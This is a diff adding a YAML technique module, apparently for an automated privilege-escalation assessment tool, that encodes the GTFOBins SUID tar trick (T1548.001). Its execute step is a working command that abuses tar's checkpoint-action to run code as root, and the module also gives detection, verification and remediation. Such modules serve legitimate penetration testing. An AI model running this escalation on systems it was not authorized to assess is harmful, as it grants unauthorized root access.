@@ -1,0 +1,29 @@
+# SUID tar → root (GTFOBins)
+technique: T1548.001
+name: SUID tar → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: tar
+execute:
+  # --checkpoint-action=exec runs its arg per checkpoint; with
+  # --checkpoint=1 and a trivial archive (/dev/null → /dev/null), it
+  # fires exactly once with the SUID context (root).
+  command: "{{binary}} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='id'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    tar's `--checkpoint-action=exec` runs an arbitrary command each
+    checkpoint. Combined with `--checkpoint=1` and a null archive, it
+    fires exactly once with the SUID context.
+  remediation: >
+    Remove the SUID bit from tar.
+  refs: [T1548.001, GTFOBins/tar]
